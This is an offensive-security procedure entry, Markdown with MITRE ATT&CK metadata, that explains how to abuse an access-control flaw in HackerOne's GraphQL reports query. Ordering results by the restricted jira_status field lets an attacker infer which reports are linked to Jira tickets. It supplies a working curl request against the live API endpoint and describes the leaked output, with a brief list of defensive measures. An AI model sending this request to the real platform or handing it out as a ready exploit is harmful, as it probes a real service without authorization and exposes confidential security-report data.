---
id: proc-graphql-jira-sort-query-001
name: Query-Reports-Ordered-by-Jira-Status
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.237Z'
tactics:
  - '[[Discovery]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - graphql
  - jira
  - sorting
commands:
  - '[[commands/graphql-query-reports-by-jira-status]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: medium
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Query-Reports-Ordered-by-Jira-Status

## Summary

This procedure queries HackerOne's GraphQL API for reports on a specific team, but orders them by the restricted 'jira_status' field, exploiting improper access controls to observe increased total_count and null Jira fields, indicating hidden associations.

## Description

Targeting the vulnerability in the reports query endpoint, this step modifies the order_by clause to use jira_status, which triggers a backend JOIN on Jira data without authorization checks. This reveals discrepancies, such as extra reports in the listing, allowing inference of which reports have Jira tickets without direct access to the data. Tested on teams known to use Jira.

## Requirements

1. Authenticated session as before
2. Same team handle from baseline
3. HTTP client for GraphQL POST

## Defense

Defensive measures and detection strategies:

- Enforce authorization on all sortable fields in GraphQL schema
- Audit backend SQL JOINs to restrict unauthorized fields
- Alert on queries using internal fields like jira_status

## Objectives

1. Trigger sorting on restricted field
2. Observe count and listing discrepancies
3. Infer Jira-linked reports

## Instructions

### Step 1: Execute Jira Status GraphQL Query

**Context**: Send the modified POST request to sort reports by jira_status, capturing the response for analysis.

**Command** ([[commands/graphql-query-reports-by-jira-status]]):
```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ reports(where: {team: {handle: {_eq: \"team_handle\"}}}, order_by: {direction: ASC, field: jira_status}) { total_count nodes { substate jira_escalation_state jira_escalation_last_state_change_at created_at disclosed_at extracted_report_data { hosts } title url team { handle } reporter { username } } } }"}'
```

> The command returns JSON with elevated total_count and nodes showing nulls in jira_escalation_state, confirming the sort influences results based on hidden Jira data.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/graphql-query-reports-by-jira-status]]

## Tools Used


## Tags

- [[graphql]]
- [[jira]]
- [[sorting]]
